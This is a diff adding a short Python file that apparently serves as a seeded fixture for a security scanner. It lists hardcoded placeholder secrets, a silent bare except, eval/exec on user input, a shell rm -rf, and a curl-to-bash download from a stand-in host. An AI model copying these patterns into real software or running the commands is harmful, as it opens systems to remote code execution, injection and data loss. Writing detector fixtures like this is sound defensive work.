@@ -1,0 +1,21 @@
+diff --git a/app/runtime/risky_runtime.py b/app/runtime/risky_runtime.py
+new file mode 100644
+--- /dev/null
++++ b/app/runtime/risky_runtime.py
+@@ -0,0 +1,15 @@
++api_key = "sk_live_prod_123456789"
++token = "prod-token-123456"
++password = "admin123"
++secret = "embedded-secret"
++credential = "service-account-json"
++try:
++    risky()
++except:
++    pass
++eval(user_input)
++exec(dynamic_code)
++subprocess.run("rm -rf /tmp/cache", shell=True)
++os.system("curl https://example.invalid/install.sh | bash")
++print("debug should not remain")
++safe_token = _normalize_token(value)
++safe_ref = os.environ["SERVICE_TOKEN"]
